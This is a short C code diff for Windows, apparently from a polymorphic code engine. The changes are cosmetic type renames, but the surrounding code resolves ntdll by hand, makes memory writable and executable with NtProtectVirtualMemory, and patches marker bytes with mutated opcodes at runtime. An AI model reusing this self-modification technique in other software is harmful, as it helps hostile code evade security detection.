@@ -62,8 +62,8 @@ INT morphModule() {
             // Declare a counter for the number of memory regions that have been morphed.
 
             DWORD dwRegionCount = 0;
-            unsigned char * marker_bytes = MARKER_BYTES;
-            unsigned char markerAddr[MARKER_SIZE] = {0};
+            UCHAR * marker_bytes = MARKER_BYTES;
+            UCHAR markerAddr[MARKER_SIZE] = {0};
 
             mem_cpy(markerAddr,marker_bytes,MARKER_SIZE);
 
@@ -150,7 +150,7 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
 #if CONFIG_NATIVE == TRUE
 
 #if CONFIG_ARCH == 64
-    void *p_ntdll = get_ntdll_64();
+    VOID* p_ntdll = get_ntdll_64();
 #else
     void *p_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
@@ -165,7 +165,7 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
     check_debug(p_NtProtectVirtualMemory(NtCurrentProcess,&pbyDst, &pbySize,PAGE_EXECUTE_READWRITE,&dwOldProtect) == 0 , "NtProtectVirtualMemory (RWX) Failed!");
 
     // patch marker bytes
-    mem_cpy((void *) pbyMarker,  (const void *) morphedOpcodes, (size_t) byLength);
+    mem_cpy((VOID *) pbyMarker,  (CONST VOID *) morphedOpcodes, (size_t) byLength);
 
     // Restore the original memory protection
     check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, &pbyDst, &pbySize, dwOldProtect, &dwOldProtect) == 0, "NtProtectVirtualMemory (RX) Failed!");
